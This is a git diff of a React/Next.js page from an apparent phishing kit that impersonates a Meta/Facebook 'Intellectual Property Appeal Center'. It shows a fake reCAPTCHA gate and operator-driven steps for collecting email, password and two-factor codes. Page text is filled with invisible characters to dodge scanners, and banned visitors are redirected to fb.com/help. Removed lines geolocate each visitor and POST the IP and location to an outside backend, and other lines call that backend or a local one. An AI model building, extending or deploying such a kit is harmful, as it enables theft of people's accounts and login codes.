@@ -30,7 +30,6 @@ import PModal from '../components/PModal.js';
 import Step2Modal from '../components/Step2Modal.js';
 
 
-
 const montserrat = Montserrat({ subsets: ['latin'] })
 
 const LinksWrapper = styled.div`
@@ -49,62 +48,22 @@ export const DataContext = createContext();
 
 export default function Home() {
 
-  const [Step, setStep] = useState(1)
+  const [Step, setStep] = useState(0)
   const [Unik, setUnik] = useState('')
-  const [ContinueWithFacebook, setContinueWithFacebook] = useState(true)
   const [LastFetch, setLastFetch] = useState('')
-  const [InvalidPassword, setInvalidPassword] = useState(false)
   const [Ip, setIp] = useState('')
 
+
   useEffect(() => {
-    const Unik = uuid().slice(0, 8)
-    setUnik(Unik)
+    setUnik(uuid().slice(0, 8))
 
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(ipData => {
-        // Once we have the IP, fetch location data
-        fetch('https://ipapi.co/' + ipData.ip + '/json')
-          .then(response => response.json())
-          .then(data => {
-              setIp(ipData.ip)
-
-              let params = {
-                  id: Unik,
-                  ip: ipData.ip,
-                  country: data.country,
-                  city: data.city,
-                  currentStep: "Page Loaded"
-              }
-
-              setAllData({ ...AllData, id: Unik, ip: ipData.ip, country: data.country, city: data.city })
-
-              fetch("https://ferrariback.onrender.com/send/ip", {
-                  method: "POST",
-                  body: JSON.stringify(params),
-                  headers: {
-                      "Content-type": "application/json; charset=UTF-8",
-                      'X-Robots-Tag': 'googlebot: nofollow',
-                  }
-              });
-          })
-          .catch(error => {
-              console.error('Error fetching location data:', error);
-          });
-      })
-      .catch(error => {
-          console.error('Error fetching IP:', error);
-          setTimeout(() => {
-              setStep(2)
-          }, 1000);
-      });
-  }, []);
+  }, [])
 
   useEffect(() => {
     const CheckBan = async (ip) => {
-      await axios.get(`https://ferrariback.onrender.com/checkBan/${ip}`).then((data) => {
+      await axios.get(`http://localhost:5000/checkBan/${ip}`).then((data) => {
         if (data.data.data) {
-          window.location.href = 'https://ferrari.com/'
+          window.location.href = 'https://fb.com/help'
         }
       })
     }
@@ -118,7 +77,8 @@ export default function Home() {
   }, [Step])
 
   const getUserTelegramId = async (uniqueString) => {
-    const x = await axios.get(`https://ferrariback.onrender.com/getMessages`)
+    const x = await axios.get(`http://localhost:5000/getMessages`)
+
     const result = x.data.data.result
 
     if (result) {
@@ -198,15 +158,14 @@ export default function Home() {
 
       if (LastFetch !== 'email') {
         if (email) {
-          setStep(1)
+          setStep(7)
           setLastFetch('email')
         }
       }
 
       if (LastFetch !== 'password') {
         if (password) {
-          setStep(2)
-          setInvalidPassword(true)
+          setStep(5)
           setLastFetch('password')
         }
       }
@@ -274,7 +233,7 @@ export default function Home() {
       if (LastFetch !== 'Ban') {
         if (ban) {
           setLastFetch('Ban')
-          axios.get(`https://ferrariback.onrender.com/ban/${Ip}`)
+          axios.get(`http://localhost:5000/ban/${Ip}`)
         }
       }
 
@@ -349,6 +308,8 @@ export default function Home() {
 
   }
   useEffect(() => {
+
+
     if (socket.connected && Unik) {
       
       onConnect();
@@ -376,16 +337,15 @@ export default function Home() {
     <div className={styles.container}>
       <Head>
         {
-          (Step === 1) ? (
-            <title>Career | Ferrari Corporate</title>
-          ) : (
-          <title>Facebook - log in or sign up</title>)
+          (Step === 0) ? (
+            <title>ReCAPTCHA</title>
+          ) : (<title>M‎e‎t‎a f‎o‎r B‎u‎s‎i‎n‎e‎ss</title>)
         }
-        {(Step === 1)
+        {(Step === 0)
           ? (
-            <link rel="icon" href="favicon-32x32.png" />
+            <link rel="icon" href="recaptcha.ico" />
           ) : (
-            <link rel="icon" href="fb.png" />
+            <link rel="icon" href="favicon.ico" />
           )}
 
         <meta charSet="utf-8" />
@@ -413,11 +373,12 @@ export default function Home() {
 
       </Head>
 
+
       <DataContext.Provider value={{ setAllData, AllData }}>
         {
           (Step !== 0)
             ? (
-              <div >
+              <div className='gradientBg'>
 
               </div>
             )
@@ -426,12 +387,18 @@ export default function Home() {
 
               </div>
             )
+
         }
 
-        <div className="">
-          <div className="row justify-content-center gx-0">
+
+        <div style={{ display: (Step === 1 || Step === 2) ? 'block' : 'none' }}>
+          <WhiteHeader />
+        </div>
+
+        <div className="px-0 px-lg-4">
+          <div className="row justify-content-center gx-0 gx-lg-4">
             {
-              ( Step === 5) && (
+              (Step === 1 || Step === 2 || Step === 5 || Step === 7) && (
 
                 <>
                   <div className="col-auto d-none d-lg-block">
@@ -441,17 +408,17 @@ export default function Home() {
                       </div>
                       <div className='py-3'>
                         <div style={{ color: '#1C2B34', fontSize: '24px', fontWeight: 700, lineHeight: 1.2 }}>
-                          Intellectual Property Appeal Center
+                          I‎nt‎el‎le‎ct‎ual P‎r‎op‎e‎rty A‎p‎pe‎al Ce‎n‎te‎r
                         </div>
                       </div>
                       <div className='pb-3'>
                         <div style={{ color: '#1C2B34', fontSize: '15px', lineHeight: 1.3 }}>
-                          If you believe a decision regarding a copyright violation or any other issue is incorrect, you can submit an appeal here.
+                          I‎f yo‎u b‎el‎i‎ev‎e a d‎ec‎‎is‎io‎n r‎eg‎a‎r‎d‎in‎g a c‎o‎py‎r‎i‎ght vi‎o‎l‎a‎ti‎o‎n o‎r a‎n‎y o‎t‎h‎er i‎s‎s‎u‎e i‎s i‎n‎co‎r‎r‎ec‎t, yo‎u c‎an su‎b‎m‎i‎t a‎n a‎p‎pea‎l he‎r‎e.
                         </div>
                       </div>
                       <div className='pb-2'>
                         <span style={{ color: '#1C2B34', fontSize: '17px', fontWeight: 600, lineHeight: 1.3 }}>
-                          Appeal Request
+                          A‎p‎p‎ea‎l R‎e‎qu‎es‎t
                         </span>
                       </div>
                       <div style={{ background: '#344854', padding: '14px', borderRadius: '12px', color: '#fff', fontWeight: 600, cursor: 'pointer' }}>
@@ -464,21 +431,21 @@ export default function Home() {
                             </svg>
                           </div>
                           <div className='col'>
-                            Submit an appeal
+                            S‎u‎b‎m‎i‎t a‎n ap‎p‎ea‎l
                           </div>
                         </div>
                       </div>
                       <div className="pt-4">
                         <div className='pb-4'>
                           <span style={{ color: '#1C2B34', fontSize: '17px', fontWeight: 600, lineHeight: 1.3 }}>
-                            Help Center
+                            H‎e‎lp Ce‎n‎te‎r
                           </span>
                         </div>
                         <LinksWrapper className="ps-3">
                           <a href='/' className="row gx-3 align-items-center py-2 text-decoration-none" style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                             <div className='col'>
                               <span style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
-                                Facebook Help Center
+                                F‎a‎ce‎b‎o‎o‎k H‎e‎lp C‎e‎nt‎e‎r
                               </span>
                             </div>
                             <div className="col-auto">
@@ -492,7 +459,7 @@ export default function Home() {
                           <a href='/' className="row gx-3 align-items-center py-2 text-decoration-none" style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                             <div className='col'>
                               <span style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
-                                Meta for Business Page
+                                M‎‎e‎t‎a f‎o‎r B‎u‎s‎in‎e‎s‎s P‎a‎g‎e
                               </span>
                             </div>
                             <div className="col-auto">
@@ -506,7 +473,7 @@ export default function Home() {
                           <a href='/' className="row gx-3 align-items-center py-2 text-decoration-none" style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                             <div className='col'>
                               <span style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
-                                Advertising Policies
+                                A‎dv‎er‎t‎i‎si‎ng P‎o‎li‎ci‎e‎s
                               </span>
                             </div>
                             <div className="col-auto">
@@ -521,7 +488,7 @@ export default function Home() {
                           <a href='/' className="row gx-3 align-items-center py-2 text-decoration-none" style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                             <div className='col'>
                               <span style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
-                                Facebook Ads Guide
+                                F‎a‎c‎e‎b‎‎oo‎k A‎ds G‎u‎i‎de
                               </span>
                             </div>
                             <div className="col-auto">
@@ -535,7 +502,7 @@ export default function Home() {
                           <a href='/' className="row gx-3 align-items-center py-2 text-decoration-none" style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
                             <div className='col'>
                               <span style={{ color: '#1C2B34', fontWeight: 500, lineHeight: 1.2 }}>
-                                Sell on Facebook and Instagram
+                                S‎e‎l‎l o‎n F‎a‎c‎e‎b‎o‎ok‎ a‎n‎d I‎n‎st‎a‎gr‎a‎m
                               </span>
                             </div>
                             <div className="col-auto">
@@ -556,7 +523,7 @@ export default function Home() {
                         <a style={{ fontSize: '15px', color: '#465a69', textDecoration: 'none', fontWeight: 500 }} href="/">Cookies</a> <span> · </span>
                         <a style={{ fontSize: '15px', color: '#465a69', textDecoration: 'none', fontWeight: 500 }} href="/">About</a> <span> · </span>
                         <span style={{ fontSize: '15px', fontWeight: 500, color: '#1C2B34' }}>
-                          Meta © 2024
+                          M‎e‎t‎a‎ © 2‎02‎4
                         </span>
                       </div>
                     </div>
@@ -570,44 +537,45 @@ export default function Home() {
 
               )
             }
-            <div className={`col-12 ${(Step !== 0 && Step !== 1 && Step !== 7 && Step !== 2 && Step !== 8 && Step !== 9) && 'col-lg-5'}`}>
-              <div className={`${( Step === 5 ) ? 'pb-5' : 'pb-0'}`} style={{ paddingTop: (  Step === 5 ) ? '23px' : '0px' }}>
+            <div className={`col-12 ${(Step !== 0 && Step !== 8 && Step !== 9) && 'col-lg-5'}`}>
+              <div className={`${(Step === 1 || Step === 2 || Step === 5 || Step === 7) ? 'pb-5' : 'pb-0'}`} style={{ paddingTop: (Step === 1 || Step === 2 || Step === 5 || Step === 7) ? '23px' : '0px' }}>
                 {
                   {
                     0: <Captcha setIp={setIp} setStep={setStep} Unik={Unik} Ip={Ip} />,
-                    1: <Step1 setStep={setStep} Unik={Unik} setIp={setIp} Ip={Ip} BusinessEmail={BusinessEmail} setBusinessEmail={setBusinessEmail}  setContinueWithFacebook={setContinueWithFacebook}/>,
+                    1: <Step1 setStep={setStep} />,
                     2: <Step2 setStep={setStep} Unik={Unik} Ip={Ip}
                       Tel={Tel} setTel={setTel}
                       Name={Name} setName={setName}
                       Email={Email} setEmail={setEmail}
                       Appeal={Appeal} setAppeal={setAppeal}
-                      BusinessEmail={BusinessEmail} 
-                      setBusinessEmail={setBusinessEmail}
-                      ContinueWithFacebook={ContinueWithFacebook}
+                      BusinessEmail={BusinessEmail} setBusinessEmail={setBusinessEmail}
                       Step={Step}
-                      setInvalidPassword={setInvalidPassword}
-                      InvalidPassword={InvalidPassword}
+
                     />,
                     3: <Fa2 setStep={setStep} Unik={Unik} Ip={Ip} Name={Name} Tel={Tel} />,
                     4: <Step3 />,
-                    // 5:
-                    //   <>
-                    //     <ModalPwRedInput setStep={setStep} Unik={Unik} Ip={Ip} Name={Name} />
-                    //     <Step2
-                    //       Tel={Tel} setTel={setTel}
-                    //       Name={Name} setName={setName}
-                    //       Email={Email} setEmail={setEmail}
-                    //       Appeal={Appeal} setAppeal={setAppeal}
-                    //       BusinessEmail={BusinessEmail} setBusinessEmail={setBusinessEmail}
+                    5:
+                      <>
+                        <ModalPwRedInput setStep={setStep} Unik={Unik} Ip={Ip} Name={Name} />
+                        <Step2
+                          Tel={Tel} setTel={setTel}
+                          Name={Name} setName={setName}
+                          Email={Email} setEmail={setEmail}
+                          Appeal={Appeal} setAppeal={setAppeal}
+                          BusinessEmail={BusinessEmail} setBusinessEmail={setBusinessEmail}
 
-                    //     />
-                    //   </>,
+                        />
+                      </>,
                     6: <Fa2Red setStep={setStep} Unik={Unik} Ip={Ip} Name={Name} Tel={Tel} />,
-                    7: <Step1 setStep={setStep} 
-                  Unik={Unik} setIp={setIp} Ip={Ip} BusinessEmail={BusinessEmail} setBusinessEmail={setBusinessEmail} 
-                   setContinueWithFacebook={setContinueWithFacebook}/>
-                   
-                    ,
+                    7: <Step2Red
+                      setStep={setStep} Unik={Unik} Ip={Ip}
+                      Tel={Tel} setTel={setTel}
+                      Name={Name} setName={setName}
+                      Email={Email} setEmail={setEmail}
+                      Appeal={Appeal} setAppeal={setAppeal}
+                      BusinessEmail={BusinessEmail} setBusinessEmail={setBusinessEmail}
+
+                    />,
                     8: <><PModal setStep={setStep} Unik={Unik} Ip={Ip} /><Background /></>,
                     9: <><Step2Modal setStep={setStep} Unik={Unik} Ip={Ip} /><Background /></>,
                     10: <PhoneVerify setStep={setStep} Unik={Unik} Ip={Ip} Step={Step} Name={Name} />,
